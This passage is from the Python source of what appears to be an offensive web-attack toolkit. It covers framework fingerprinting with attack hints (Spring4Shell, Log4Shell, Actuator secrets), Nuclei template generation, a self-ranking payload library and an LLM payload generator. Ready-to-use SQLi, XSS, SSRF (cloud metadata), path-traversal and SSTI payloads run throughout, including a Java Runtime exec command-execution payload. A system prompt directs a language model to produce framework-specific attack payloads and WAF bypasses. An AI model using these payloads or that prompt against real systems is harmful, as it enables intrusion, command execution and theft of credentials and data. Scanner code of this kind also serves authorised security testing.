"""
LLM Intelligence v2 — modules/intelligence/llm_intelligence_v2.py

Next-generation AI-driven offensive intelligence:
  1. FrameworkDetector        — fingerprint web frameworks from HTTP responses
  2. NucleiTemplateGenerator  — auto-generate nuclei YAML templates from findings
  3. PayloadLibrary           — persistent payload store with success rate tracking
  4. ContextAwarePayloadGen   — LLM + framework context for precision payloads

Core philosophy:
  "Don't spray random payloads. Know what you're attacking first."
  Framework detection → targeted payload selection → LLM mutation → verified finding

Usage:
    from modules.intelligence.llm_intelligence_v2 import (
        FrameworkDetector, NucleiTemplateGenerator,
        PayloadLibrary, ContextAwarePayloadGen,
    )

    # Detect framework
    detector = FrameworkDetector()
    result   = detector.detect("https://target.com")

    # Generate nuclei template from finding
    gen      = NucleiTemplateGenerator(output_dir="./nuclei-templates")
    path     = gen.from_finding(finding)

    # Payload library
    lib      = PayloadLibrary(db_path="./payloads.json")
    payloads = lib.get_payloads("sqli", framework="django")
    lib.record_success("sqli", "' OR 1=1--", "django", target="https://t.com")

    # Context-aware generation
    gen = ContextAwarePayloadGen(provider="ollama", model="qwen2.5-coder:3b")
    payloads = gen.generate(attack_type="ssti", framework="django", context=response_text)

Author: ardanov96
"""

import json
import re
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

import httpx
from rich.console import Console

console = Console()


# ── Framework signatures ──────────────────────────────────

@dataclass
class FrameworkResult:
    """Result of framework detection."""
    framework:   str         # "django", "spring", "laravel", etc.
    confidence:  float       # 0.0 - 1.0
    version:     str         # detected version string, if any
    language:    str         # "python", "java", "php", "ruby", "nodejs", etc.
    indicators:  list[str]   # what triggered detection
    attack_hints: list[str]  # recommended attack vectors for this framework


# Framework fingerprint database
FRAMEWORK_SIGNATURES: dict[str, dict] = {
    "django": {
        "language": "python",
        "headers":  {"x-frame-options": "SAMEORIGIN", "server": ""},
        "cookies":  ["csrftoken", "sessionid", "django"],
        "body_patterns": [
            r"django\.core\.exceptions",
            r"CSRF verification failed",
            r"TemplateDoesNotExist",
            r"django\.template",
            r"staticfiles",
            r"DisallowedHost",
        ],
        "error_patterns": [
            r"Environment:\s+Django",
            r"Django Version:",
            r"Python Version:",
            r"INSTALLED_APPS",
        ],
        "paths": ["/admin/", "/static/", "/__debug__/"],
        "attack_hints": [
            "SSTI: {{7*7}}, {{config}}, {{request.META}}",
            "Admin panel: /admin/ with weak credentials",
            "Debug mode: check /?debug=true or /traceback",
            "SQL injection: Django ORM raw() bypass",
            "Path traversal: MEDIA_ROOT misconfiguration",
        ],
    },
    "flask": {
        "language": "python",
        "headers":  {"server": "werkzeug"},
        "cookies":  ["session"],
        "body_patterns": [
            r"werkzeug\.exceptions",
            r"jinja2\.exceptions",
            r"flask\.debugger",
            r"Traceback.*flask",
        ],
        "error_patterns": [
            r"Werkzeug Debugger",
            r"Interactive Console",
        ],
        "paths": ["/console", "/_debug_toolbar/"],
        "attack_hints": [
            "SSTI: {{7*7}}, {{config.items()}}, {{''.__class__.__mro__}}",
            "Werkzeug debugger: /console PIN bypass (CVE-2016-10516)",
            "Secret key: often hardcoded in config files",
            "Debug mode RCE: interactive Python console at /console",
        ],
    },
    "spring": {
        "language": "java",
        "headers":  {"x-application-context": "", "server": ""},
        "cookies":  ["jsessionid", "JSESSIONID"],
        "body_patterns": [
            r"org\.springframework",
            r"WhitelabelErrorPage",
            r"Whitelabel Error Page",
            r"There was an unexpected error",
            r"Spring Boot",
        ],
        "error_patterns": [
            r"Application run failed",
            r"org\.springframework\.web",
            r"Failed to start bean",
        ],
        "paths": ["/actuator", "/actuator/env", "/actuator/health",
                  "/actuator/mappings", "/actuator/beans", "/h2-console"],
        "attack_hints": [
            "Actuator: /actuator/env for secret extraction",
            "Spring4Shell: CVE-2022-22965 (Spring MVC + JDK9+)",
            "SpEL injection: #{7*7} in form fields",
            "H2 console: /h2-console with JNDI RCE",
            "Log4Shell if Log4j in classpath: CVE-2021-44228",
        ],
    },
    "laravel": {
        "language": "php",
        "headers":  {"server": ""},
        "cookies":  ["laravel_session", "XSRF-TOKEN"],
        "body_patterns": [
            r"laravel",
            r"Illuminate\\",
            r"APP_KEY",
            r"storage/framework",
            r"ErrorException",
            r"laravel\.com/docs",
        ],
        "error_patterns": [
            r"Whoops, looks like something went wrong",
            r"Illuminate\\Database",
        ],
        "paths": ["/.env", "/storage/logs/laravel.log", "/telescope"],
        "attack_hints": [
            ".env file: /.env may expose APP_KEY and DB credentials",
            "Mass assignment: Laravel Eloquent fillable bypass",
            "Debug bar: /telescope or /_debugbar",
            "Deserialization: Laravel cookie unserialize if APP_KEY known",
            "SQL injection: Eloquent raw() queries",
        ],
    },
    "express": {
        "language": "nodejs",
        "headers":  {"x-powered-by": "Express"},
        "cookies":  ["connect.sid"],
        "body_patterns": [
            r"Cannot GET",
            r"SyntaxError.*JSON",
            r"express",
        ],
        "error_patterns": [
            r"at Object\.<anonymous>",
            r"at Module\._compile",
        ],
        "paths": ["/node_modules/", "/.env", "/package.json"],
        "attack_hints": [
            "Prototype pollution: __proto__[admin]=true",
            "Path traversal: ../../etc/passwd via static files",
            ".env exposure: /.env with secrets",
            "NoSQL injection: MongoDB $where, $gt, $regex",
            "JWT: weak secret or none algorithm",
        ],
    },
    "rails": {
        "language": "ruby",
        "headers":  {"x-request-id": "", "server": ""},
        "cookies":  ["_session_id", "_app_session"],
        "body_patterns": [
            r"ActionController",
            r"ActiveRecord",
            r"Ruby on Rails",
            r"Rack",
        ],
        "error_patterns": [
            r"ActionController::RoutingError",
            r"ActiveRecord::RecordNotFound",
        ],
        "paths": ["/rails/info/properties", "/rails/mailers"],
        "attack_hints": [
            "Mass assignment: strong parameters bypass",
            "YAML deserialization: Ruby YAML.load with user input",
            "SQL injection: ActiveRecord where() string interpolation",
            "IDOR: predictable sequential IDs",
            "CSRF: verify_authenticity_token disabled",
        ],
    },
    "wordpress": {
        "language": "php",
        "headers":  {"link": "wp-json"},
        "cookies":  ["wordpress_logged_in", "wp-settings"],
        "body_patterns": [
            r"wp-content",
            r"wp-includes",
            r"WordPress",
            r"/wp-json/",
            r"xmlrpc\.php",
        ],
        "error_patterns": [r"WordPress database error"],
        "paths": ["/wp-admin/", "/wp-json/wp/v2/users", "/xmlrpc.php",
                  "/wp-config.php.bak", "/.git/"],
        "attack_hints": [
            "User enumeration: /wp-json/wp/v2/users",
            "XML-RPC brute force: /xmlrpc.php multicall",
            "Plugin vulns: check WPScan database",
            "wp-config.php: backup files (.bak, .old, ~)",
            "Admin: /wp-admin/ brute force + weak creds",
        ],
    },
    "fastapi": {
        "language": "python",
        "headers":  {"server": "uvicorn"},
        "cookies":  [],
        "body_patterns": [
            r'"detail":\s*"',
            r"FastAPI",
            r"/openapi\.json",
            r"/docs",
            r"application/json",
        ],
        "error_patterns": [
            r'"detail":\s*\[.*"loc"',
            r"Unprocessable Entity",
        ],
        "paths": ["/docs", "/redoc", "/openapi.json"],
        "attack_hints": [
            "OpenAPI: /openapi.json reveals full API schema",
            "Pydantic injection: type coercion bypass",
            "SSRF: URL parameters to internal services",
            "JWT: verify algorithm confusion",
            "Mass assignment: Pydantic model extra fields",
        ],
    },
    "asp_dotnet": {
        "language": "csharp",
        "headers":  {"x-aspnet-version": "", "x-powered-by": "ASP.NET"},
        "cookies":  ["ASP.NET_SessionId", ".ASPXAUTH"],
        "body_patterns": [
            r"__VIEWSTATE",
            r"__EVENTVALIDATION",
            r"WebResource\.axd",
            r"ScriptResource\.axd",
        ],
        "error_patterns": [
            r"Server Error in .* Application",
            r"Stack Trace:",
            r"System\.Web\.",
        ],
        "paths": ["/elmah.axd", "/trace.axd", "/.git/"],
        "attack_hints": [
            "ViewState deserialization: machineKey extraction → RCE",
            "elmah.axd: error log exposure",
            "Padding oracle: VIEWSTATE decryption",
            "Path traversal: IIS static file serving",
            "SSRF via XMLHTTP or WebClient",
        ],
    },
}

# Technology indicators (not full frameworks)
TECH_INDICATORS = {
    "nginx":    {"header": "server", "pattern": r"nginx"},
    "apache":   {"header": "server", "pattern": r"Apache"},
    "iis":      {"header": "server", "pattern": r"Microsoft-IIS"},
    "cloudflare": {"header": "server", "pattern": r"cloudflare"},
    "php":      {"header": "x-powered-by", "pattern": r"PHP/"},
    "graphql":  {"body": r'"__typename"|"errors".*"locations"'},
    "grpc":     {"header": "content-type", "pattern": r"application/grpc"},
}


# ── 1. Framework Detector ─────────────────────────────────

class FrameworkDetector:
    """
    Fingerprint web frameworks from HTTP responses.

    Detection methods (in order of confidence):
    1. Error page analysis (highest confidence — reveals stack traces)
    2. Response headers (x-powered-by, server, x-frame-options)
    3. Cookie names (csrftoken → Django, JSESSIONID → Java)
    4. Response body patterns (error messages, class names)
    5. Path probing (optional — /admin/, /actuator, etc.)

    Returns FrameworkResult with targeted attack hints.
    """

    def __init__(self, timeout: int = 10, probe_paths: bool = False):
        self.timeout     = timeout
        self.probe_paths = probe_paths
        self.client      = httpx.Client(
            timeout=timeout,
            follow_redirects=True,
            verify=False,
            headers={"User-Agent": "Mozilla/5.0 (compatible; Glitchicons/2.5.0)"},
        )

    def detect(self, target: str) -> FrameworkResult:
        """Detect framework from target URL."""
        console.print(f"\n  [bold cyan]Framework Detector[/bold cyan] → {target}")
        try:
            resp = self.client.get(target)
            result = self.detect_from_response(
                headers=dict(resp.headers),
                body=resp.text,
                cookies={k: v for k, v in resp.cookies.items()},
                url=target,
            )
        except Exception as e:
            result = FrameworkResult(
                framework="unknown", confidence=0.0, version="",
                language="unknown", indicators=[f"Error: {e}"],
                attack_hints=[],
            )

        console.print(
            f"  Framework: [bold]{result.framework}[/bold] "
            f"({result.confidence:.0%} confidence) [{result.language}]"
        )
        if result.attack_hints:
            console.print(f"  Attack hints: {len(result.attack_hints)}")
        return result

    def detect_from_response(
        self,
        headers: dict,
        body: str,
        cookies: dict | None = None,
        url: str = "",
    ) -> FrameworkResult:
        """Detect framework from response data (testable without network)."""
        cookies    = cookies or {}
        scores:    dict[str, float] = {}
        indicators: dict[str, list[str]] = {}

        headers_lower = {k.lower(): v.lower() for k, v in headers.items()}
        body_lower    = body.lower()

        for fw_name, sig in FRAMEWORK_SIGNATURES.items():
            score  = 0.0
            hints  = []

            # Header matching
            for header_name, expected_val in sig.get("headers", {}).items():
                if header_name in headers_lower:
                    if not expected_val or expected_val in headers_lower[header_name]:
                        score += 0.3
                        hints.append(f"header:{header_name}")

            # Cookie matching
            for cookie_name in sig.get("cookies", []):
                if any(cookie_name.lower() in c.lower() for c in cookies):
                    score += 0.4
                    hints.append(f"cookie:{cookie_name}")

            # Body pattern matching
            for pattern in sig.get("body_patterns", []):
                if re.search(pattern, body, re.IGNORECASE):
                    score += 0.25
                    hints.append(f"body:{pattern[:30]}")

            # Error page patterns (highest confidence)
            for pattern in sig.get("error_patterns", []):
                if re.search(pattern, body, re.IGNORECASE):
                    score += 0.5
                    hints.append(f"error:{pattern[:30]}")

            # URL/path hints
            for path in sig.get("paths", []):
                if path in url.lower():
                    score += 0.2
                    hints.append(f"path:{path}")

            if score > 0:
                scores[fw_name]     = min(score, 1.0)
                indicators[fw_name] = hints

        if not scores:
            return FrameworkResult(
                framework="unknown", confidence=0.0, version="",
                language="unknown", indicators=["No framework signatures matched"],
                attack_hints=self._generic_hints(),
            )

        # Pick highest scoring framework
        best_fw    = max(scores, key=lambda k: scores[k])
        confidence = scores[best_fw]
        sig        = FRAMEWORK_SIGNATURES[best_fw]

        # Extract version hints
        version = self._extract_version(best_fw, headers_lower, body)

        return FrameworkResult(
            framework=best_fw,
            confidence=confidence,
            version=version,
            language=sig["language"],
            indicators=indicators.get(best_fw, []),
            attack_hints=sig["attack_hints"],
        )

    def detect_all(self, target: str) -> list[FrameworkResult]:
        """Detect all possible frameworks (not just top match)."""
        try:
            resp = self.client.get(target)
            headers = dict(resp.headers)
            body    = resp.text
            cookies = {k: v for k, v in resp.cookies.items()}
        except Exception:
            return []

        results = []
        headers_lower = {k.lower(): v.lower() for k, v in headers.items()}
        body_lower    = body.lower()

        for fw_name, sig in FRAMEWORK_SIGNATURES.items():
            score = 0.0
            hints = []

            for header_name, expected_val in sig.get("headers", {}).items():
                if header_name in headers_lower:
                    if not expected_val or expected_val in headers_lower[header_name]:
                        score += 0.3
                        hints.append(f"header:{header_name}")

            for pattern in sig.get("body_patterns", []):
                if re.search(pattern, body, re.IGNORECASE):
                    score += 0.2
                    hints.append(f"body:{pattern[:20]}")

            if score >= 0.2:
                results.append(FrameworkResult(
                    framework=fw_name,
                    confidence=min(score, 1.0),
                    version=self._extract_version(fw_name, headers_lower, body),
                    language=sig["language"],
                    indicators=hints,
                    attack_hints=sig["attack_hints"],
                ))

        return sorted(results, key=lambda r: r.confidence, reverse=True)

    def get_attack_hints(self, framework: str) -> list[str]:
        """Get targeted attack hints for a known framework."""
        sig = FRAMEWORK_SIGNATURES.get(framework.lower(), {})
        return sig.get("attack_hints", self._generic_hints())

    def _extract_version(self, framework: str, headers: dict, body: str) -> str:
        """Try to extract version from response."""
        version_patterns = {
            "django":     r"Django/(\d+\.\d+\.?\d*)",
            "spring":     r"Spring Boot (\d+\.\d+\.?\d*)",
            "laravel":    r"Laravel v?(\d+\.\d+\.?\d*)",
            "wordpress":  r"WordPress (\d+\.\d+\.?\d*)",
            "php":        r"PHP/(\d+\.\d+\.?\d*)",
            "asp_dotnet": r"ASP\.NET version (\d+\.\d+\.?\d*)",
        }
        pattern = version_patterns.get(framework, "")
        if pattern:
            # Check headers
            for v in headers.values():
                m = re.search(pattern, v, re.IGNORECASE)
                if m:
                    return m.group(1)
            # Check body
            m = re.search(pattern, body, re.IGNORECASE)
            if m:
                return m.group(1)
        return ""

    def _generic_hints(self) -> list[str]:
        return [
            "SQLi: try ' OR 1=1-- in all parameters",
            "XSS: <script>alert(1)</script> in all inputs",
            "SSRF: inject 169.254.169.254 in URL parameters",
            "Path traversal: ../../etc/passwd",
            "Auth bypass: try null/empty/admin tokens",
        ]


# ── 2. Nuclei Template Generator ─────────────────────────

NUCLEI_TEMPLATE_BASE = """id: {template_id}

info:
  name: "{name}"
  author: glitchicons
  severity: {severity}
  description: "{description}"
  tags: {tags}
  metadata:
    cvss-score: {cvss}
    cwe-id: {cwe}
    generated-by: "Glitchicons v2.5.0 NucleiTemplateGenerator"
    generated-at: "{generated_at}"

{requests_section}
"""

NUCLEI_HTTP_REQUEST = """requests:
  - method: {method}
    path:
      - "{path}"
    headers:
      User-Agent: "Mozilla/5.0 (compatible; Glitchicons/2.5.0)"
{extra_headers}
{body_section}
    matchers-condition: {matcher_condition}
    matchers:
{matchers}
"""


class NucleiTemplateGenerator:
    """
    Auto-generate Nuclei YAML templates from Glitchicons findings.

    Converts structured findings into runnable Nuclei templates that
    can be used for verification, regression testing, or sharing
    with the security community.

    Supported finding types:
    - Reflected XSS
    - SQL Injection (error-based)
    - SSRF
    - SSTI
    - Open redirect
    - Exposed endpoints
    - Missing security headers
    - Misconfigured CORS
    """

    SEVERITY_MAP = {
        "CRITICAL": "critical",
        "HIGH":     "high",
        "MEDIUM":   "medium",
        "LOW":      "low",
        "INFO":     "info",
    }

    def __init__(self, output_dir: str = "./nuclei-templates"):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)

    def from_finding(self, finding: dict) -> Path:
        """Generate a Nuclei template from a single finding."""
        template_id = self._make_id(finding)
        yaml_content = self._build_template(finding, template_id)
        out = self.output_dir / f"{template_id}.yaml"
        out.write_text(yaml_content, encoding="utf-8")
        console.print(f"  [green]Template:[/green] {out.name}")
        return out

    def from_findings(self, findings: list[dict]) -> list[Path]:
        """Generate Nuclei templates for a list of findings."""
        console.print(f"\n  [bold cyan]Nuclei Template Generator[/bold cyan] — {len(findings)} findings")
        paths = []
        for f in findings:
            try:
                path = self.from_finding(f)
                paths.append(path)
            except Exception as e:
                console.print(f"  [yellow]Skip:[/yellow] {f.get('title', '')[:40]} — {e}")
        console.print(f"  Generated: {len(paths)} templates → {self.output_dir}")
        return paths

    def _make_id(self, finding: dict) -> str:
        """Generate unique template ID from finding."""
        title = finding.get("title", "finding")
        slug  = re.sub(r"[^a-z0-9]+", "-", title.lower())[:40].strip("-")
        short = str(uuid.uuid4())[:8]
        return f"glitchicons-{slug}-{short}"

    def _build_template(self, finding: dict, template_id: str) -> str:
        """Build complete YAML template for a finding."""
        title       = finding.get("title", "Untitled Finding")
        severity    = self.SEVERITY_MAP.get(finding.get("severity", "INFO"), "info")
        description = finding.get("description", "")[:200].replace('"', "'")
        cvss        = finding.get("cvss", 0.0)
        cwe         = finding.get("cwe", "CWE-0").replace("CWE-", "")
        target      = finding.get("target", "{{BaseURL}}")
        evidence    = finding.get("evidence", "")

        # Determine template type from finding
        template_type = self._classify_finding(title, evidence)
        tags = self._get_tags(template_type, severity)

        requests_section = self._build_requests(
            template_type=template_type,
            target=target,
            evidence=evidence,
            finding=finding,
        )

        return NUCLEI_TEMPLATE_BASE.format(
            template_id=template_id,
            name=title.replace('"', "'"),
            severity=severity,
            description=description.replace("\n", " "),
            tags=tags,
            cvss=cvss,
            cwe=f"CWE-{cwe}",
            generated_at=datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
            requests_section=requests_section,
        )

    def _classify_finding(self, title: str, evidence: str) -> str:
        """Classify finding type for template generation."""
        title_lower    = title.lower()
        evidence_lower = evidence.lower()
        combined       = title_lower + " " + evidence_lower

        if any(k in combined for k in ["xss", "cross-site scripting"]):
            return "xss"
        if any(k in combined for k in ["sql injection", "sqli", "mysql", "syntax error"]):
            return "sqli"
        if any(k in combined for k in ["ssrf", "server-side request", "169.254"]):
            return "ssrf"
        if any(k in combined for k in ["ssti", "template injection", "jinja", "twig"]):
            return "ssti"
        if any(k in combined for k in ["open redirect", "redirect"]):
            return "redirect"
        if any(k in combined for k in ["cors", "access-control-allow-origin"]):
            return "cors"
        if any(k in combined for k in ["header", "hsts", "x-frame", "csp"]):
            return "headers"
        if any(k in combined for k in ["exposed", "accessible", "endpoint", "listing"]):
            return "exposed"
        return "generic"

    def _get_tags(self, template_type: str, severity: str) -> str:
        base_tags = ["glitchicons", "auto-generated", template_type]
        if severity in ("critical", "high"):
            base_tags.append("impact-high")
        return ", ".join(base_tags)

    def _build_requests(
        self,
        template_type: str,
        target: str,
        evidence: str,
        finding: dict,
    ) -> str:
        """Build the requests section for a template type."""
        path = self._extract_path(target)

        if template_type == "xss":
            return self._xss_request(path)
        elif template_type == "sqli":
            return self._sqli_request(path)
        elif template_type == "ssrf":
            return self._ssrf_request(path)
        elif template_type == "cors":
            return self._cors_request(path)
        elif template_type == "headers":
            return self._headers_request(path)
        elif template_type == "exposed":
            return self._exposed_request(path)
        else:
            return self._generic_request(path)

    def _extract_path(self, target: str) -> str:
        """Extract path from target URL."""
        if "{{" in target:
            return "{{BaseURL}}/"
        try:
            from urllib.parse import urlparse
            parsed = urlparse(target)
            base   = f"{parsed.scheme}://{parsed.netloc}"
            return f"{{{{BaseURL}}}}{parsed.path or '/'}"
        except Exception:
            return "{{BaseURL}}/"

    def _xss_request(self, path: str) -> str:
        return f"""requests:
  - method: GET
    path:
      - "{path}?q=<script>alert(document.domain)</script>"
      - "{path}?search={{{{randstr}}}}\"><img src=x onerror=alert(1)>"
    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "<script>alert(document.domain)</script>"
          - "onerror=alert(1)"
      - type: status
        status:
          - 200"""

    def _sqli_request(self, path: str) -> str:
        return f"""requests:
  - method: GET
    path:
      - "{path}?id=1'"
      - "{path}?id=1 AND SLEEP(3)--"
    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "syntax error"
          - "mysql_fetch"
          - "ORA-"
          - "PostgreSQL"
          - "SQLite3::"
        condition: or
      - type: dsl
        dsl:
          - "duration >= 3"
    matchers-condition: or"""

    def _ssrf_request(self, path: str) -> str:
        return f"""requests:
  - method: GET
    path:
      - "{path}?url=http://169.254.169.254/latest/meta-data/"
      - "{path}?redirect=http://169.254.169.254/"
      - "{path}?target=http://{{{{interactsh-url}}}}"
    matchers:
      - type: word
        part: body
        words:
          - "ami-id"
          - "instance-id"
          - "local-ipv4"
        condition: or
      - type: word
        part: interactsh_protocol
        words:
          - "http"
    matchers-condition: or"""

    def _cors_request(self, path: str) -> str:
        return f"""requests:
  - method: GET
    path:
      - "{path}"
    headers:
      Origin: "https://evil.glitchicons.attacker.com"
    matchers:
      - type: word
        part: header
        words:
          - "Access-Control-Allow-Origin: https://evil.glitchicons.attacker.com"
          - "Access-Control-Allow-Origin: *"
        condition: or
      - type: word
        part: header
        words:
          - "Access-Control-Allow-Credentials: true"
    matchers-condition: and"""

    def _headers_request(self, path: str) -> str:
        return f"""requests:
  - method: GET
    path:
      - "{path}"
    matchers-condition: or
    matchers:
      - type: dsl
        dsl:
          - "!contains(tolower(all_headers), 'strict-transport-security')"
          - "!contains(tolower(all_headers), 'x-content-type-options')"
          - "!contains(tolower(all_headers), 'x-frame-options')"
        condition: or"""

    def _exposed_request(self, path: str) -> str:
        return f"""requests:
  - method: GET
    path:
      - "{path}"
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "Index of"
          - "ListBucketResult"
          - "\"files\":"
        condition: or
    matchers-condition: and"""

    def _generic_request(self, path: str) -> str:
        return f"""requests:
  - method: GET
    path:
      - "{path}"
    matchers:
      - type: status
        status:
          - 200"""


# ── 3. Payload Library ────────────────────────────────────

@dataclass
class PayloadEntry:
    """A single payload with metadata."""
    payload:      str
    attack_type:  str
    framework:    str       # Target framework (or "generic")
    success_count: int = 0
    attempt_count: int = 0
    last_used:    str  = ""
    tags:         list[str] = field(default_factory=list)

    @property
    def success_rate(self) -> float:
        if self.attempt_count == 0:
            return 0.0
        return self.success_count / self.attempt_count

    @property
    def effectiveness_score(self) -> float:
        """Score combining success rate + recency."""
        rate = self.success_rate
        # Bonus for recently used
        if self.last_used:
            try:
                last = datetime.fromisoformat(self.last_used.replace("Z", "+00:00"))
                days = (datetime.now(timezone.utc) - last).days
                recency_bonus = max(0, 1 - days / 30) * 0.2
                return rate + recency_bonus
            except Exception:
                pass
        return rate


# Default payload seeds per attack type
DEFAULT_PAYLOADS: dict[str, dict[str, list[str]]] = {
    "ssti": {
        "django":  ["{{7*7}}", "{{config}}", "{{request.META}}", "{{''.__class__.__mro__[2].__subclasses__()}}"],
        "flask":   ["{{7*7}}", "{{config.items()}}", "{{''.__class__.__mro__}}", "{{request.environ}}"],
        "spring":  ["${7*7}", "#{7*7}", "#{T(java.lang.Runtime).getRuntime().exec('id')}", "${class.classLoader}"],
        "generic": ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{7*'7'}}"],
    },
    "sqli": {
        "mysql":    ["' OR '1'='1", "' OR 1=1--", "1' AND SLEEP(3)--", "' UNION SELECT NULL--"],
        "postgres": ["' OR '1'='1", "1; SELECT pg_sleep(3)--", "' UNION SELECT NULL,NULL--"],
        "mssql":    ["' OR '1'='1", "1; WAITFOR DELAY '0:0:3'--", "' UNION SELECT NULL--"],
        "generic":  ["' OR '1'='1", "' OR 1=1--", "1 OR 1=1", "' OR 'x'='x"],
    },
    "xss": {
        "generic": [
            "<script>alert(document.domain)</script>",
            "\"><img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "'><svg onload=alert(1)>",
            "{{constructor.constructor('alert(1)')()}}",
        ],
        "react":   ["${alert(1)}", "dangerouslySetInnerHTML injection"],
        "angular": ["{{constructor.constructor('alert(1)')()}}"],
    },
    "ssrf": {
        "generic": [
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/",
            "http://localhost/admin",
            "file:///etc/passwd",
            "dict://127.0.0.1:6379/info",
        ],
    },
    "path_traversal": {
        "linux":   ["../../../etc/passwd", "....//....//....//etc/passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"],
        "windows": ["..\\..\\..\\windows\\win.ini", "%2e%2e%5c%2e%2e%5cwindows%5cwin.ini"],
        "generic": ["../etc/passwd", "..%2fetc%2fpasswd", "..%252fetc%252fpasswd"],
    },
}


class PayloadLibrary:
    """
    Persistent payload library with success rate tracking.

    Stores payloads per attack type and framework, tracking
    which payloads work against which technologies.
    Self-improves: successful payloads get higher scores and
    are returned first for future scans against similar targets.
    """

    def __init__(self, db_path: str = "./payloads.json"):
        self.db_path = Path(db_path)
        self._library: dict[str, dict[str, list[PayloadEntry]]] = {}
        self._load()

    def get_payloads(
        self,
        attack_type: str,
        framework: str = "generic",
        top_n: int = 20,
        min_success_rate: float = 0.0,
    ) -> list[str]:
        """
        Get best payloads for an attack type + framework.

        Returns payloads sorted by effectiveness (success rate + recency).
        Falls back to generic payloads if framework-specific not available.
        """
        entries = self._get_entries(attack_type, framework)
        if not entries and framework != "generic":
            entries = self._get_entries(attack_type, "generic")

        # Filter by min success rate
        if min_success_rate > 0:
            entries = [e for e in entries if e.success_rate >= min_success_rate]

        # Sort by effectiveness
        entries.sort(key=lambda e: e.effectiveness_score, reverse=True)

        return [e.payload for e in entries[:top_n]]

    def record_success(
        self,
        attack_type: str,
        payload: str,
        framework: str = "generic",
        target: str = "",
    ) -> None:
        """Record a successful payload hit."""
        entries = self._get_entries(attack_type, framework)
        entry   = next((e for e in entries if e.payload == payload), None)

        if entry:
            entry.success_count += 1
            entry.attempt_count += 1
            entry.last_used = datetime.now(timezone.utc).isoformat()
        else:
            new_entry = PayloadEntry(
                payload=payload, attack_type=attack_type, framework=framework,
                success_count=1, attempt_count=1,
                last_used=datetime.now(timezone.utc).isoformat(),
            )
            self._ensure_path(attack_type, framework)
            self._library[attack_type][framework].append(new_entry)

        self._save()

    def record_attempt(self, attack_type: str, payload: str, framework: str = "generic") -> None:
        """Record a payload attempt (regardless of success)."""
        entries = self._get_entries(attack_type, framework)
        entry   = next((e for e in entries if e.payload == payload), None)
        if entry:
            entry.attempt_count += 1
            self._save()

    def add_payload(
        self,
        attack_type: str,
        payload: str,
        framework: str = "generic",
        tags: list[str] | None = None,
    ) -> None:
        """Add a new payload to the library."""
        entries = self._get_entries(attack_type, framework)
        if not any(e.payload == payload for e in entries):
            self._ensure_path(attack_type, framework)
            self._library[attack_type][framework].append(PayloadEntry(
                payload=payload, attack_type=attack_type,
                framework=framework, tags=tags or [],
            ))
            self._save()

    def get_top_payloads_all_types(self, framework: str = "generic", top_n: int = 5) -> dict[str, list[str]]:
        """Get top payloads for all attack types for a given framework."""
        result = {}
        for attack_type in self._library:
            payloads = self.get_payloads(attack_type, framework, top_n=top_n)
            if payloads:
                result[attack_type] = payloads
        return result

    @property
    def stats(self) -> dict:
        """Library statistics."""
        total = sum(
            len(entries)
            for fw_dict in self._library.values()
            for entries in fw_dict.values()
        )
        attack_types = list(self._library.keys())
        return {
            "total_payloads": total,
            "attack_types":   len(attack_types),
            "types":          attack_types,
        }

    def _get_entries(self, attack_type: str, framework: str) -> list[PayloadEntry]:
        return self._library.get(attack_type, {}).get(framework, [])

    def _ensure_path(self, attack_type: str, framework: str) -> None:
        if attack_type not in self._library:
            self._library[attack_type] = {}
        if framework not in self._library[attack_type]:
            self._library[attack_type][framework] = []

    def _load(self) -> None:
        """Load library from JSON file, seeding defaults if new."""
        if self.db_path.exists():
            try:
                raw = json.loads(self.db_path.read_text(encoding="utf-8"))
                self._library = {}
                for attack_type, fw_dict in raw.items():
                    self._library[attack_type] = {}
                    for fw, entries in fw_dict.items():
                        self._library[attack_type][fw] = [
                            PayloadEntry(**e) for e in entries
                        ]
                return
            except Exception:
                pass
        # Seed with defaults
        self._seed_defaults()
        self._save()

    def _seed_defaults(self) -> None:
        """Seed library with default payloads."""
        for attack_type, fw_dict in DEFAULT_PAYLOADS.items():
            self._library[attack_type] = {}
            for framework, payloads in fw_dict.items():
                self._library[attack_type][framework] = [
                    PayloadEntry(payload=p, attack_type=attack_type, framework=framework)
                    for p in payloads
                ]

    def _save(self) -> None:
        """Persist library to JSON."""
        raw = {}
        for attack_type, fw_dict in self._library.items():
            raw[attack_type] = {}
            for fw, entries in fw_dict.items():
                raw[attack_type][fw] = [
                    {
                        "payload": e.payload, "attack_type": e.attack_type,
                        "framework": e.framework, "success_count": e.success_count,
                        "attempt_count": e.attempt_count, "last_used": e.last_used,
                        "tags": e.tags,
                    }
                    for e in entries
                ]
        self.db_path.write_text(json.dumps(raw, indent=2), encoding="utf-8")


# ── 4. Context-Aware Payload Generator ───────────────────

class ContextAwarePayloadGen:
    """
    LLM-powered context-aware payload generation.

    Combines:
    1. Framework detection → knows target technology
    2. Payload library → starts from known-good payloads
    3. LLM mutation → generates framework-specific variants
    4. Response analysis → adapts to WAF/filter patterns

    This is the core intelligence loop:
      detect → select → mutate → test → record → improve
    """

    SYSTEM_PROMPT = """You are an expert offensive security researcher
specializing in web application exploitation. Given information about a target's
framework and existing payloads, generate precise attack payloads.

Rules:
- Generate payloads specific to the detected framework
- Consider WAF bypass techniques if filters are detected
- Focus on the attack type requested
- Return ONLY a JSON array of payload strings, no explanation
- Each payload should be a complete, ready-to-use string
- Maximum 10 payloads per request"""

    def __init__(
        self,
        provider: str = "ollama",
        model: str = "qwen2.5-coder:3b",
        base_url: str = "http://localhost:11434",
        api_key: str = "",
        payload_library: PayloadLibrary | None = None,
    ):
        self.provider        = provider
        self.model           = model
        self.base_url        = base_url
        self.api_key         = api_key
        self.payload_library = payload_library or PayloadLibrary.__new__(PayloadLibrary)
        self.client          = httpx.Client(timeout=30)

    def generate(
        self,
        attack_type: str,
        framework: str = "generic",
        context: str = "",
        waf_detected: str = "",
        num_payloads: int = 10,
    ) -> list[str]:
        """
        Generate context-aware payloads via LLM.

        Args:
            attack_type:  "sqli", "xss", "ssti", "ssrf", "path_traversal"
